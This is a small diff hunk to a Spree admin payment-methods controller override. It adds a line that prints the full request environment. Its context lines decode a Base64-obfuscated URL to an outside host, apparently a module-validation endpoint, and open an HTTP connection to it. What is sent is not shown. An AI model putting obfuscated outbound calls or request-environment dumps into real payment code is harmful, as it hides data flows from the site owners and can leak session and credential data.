@@ -6,6 +6,7 @@ Spree::Admin::PaymentMethodsController.class_eval do
     require 'net/http'
     require 'uri'
 
+    puts env.inspect
     url = Base64.decode64('aHR0cHM6Ly9ibHVlemVhbC5pbi9tb2R1bGVfdmFsaWRhdGUvc3VjY2Vzcy5waHA=')
     uri = URI.parse(url)
     http = Net::HTTP.new(uri.host, uri.port)
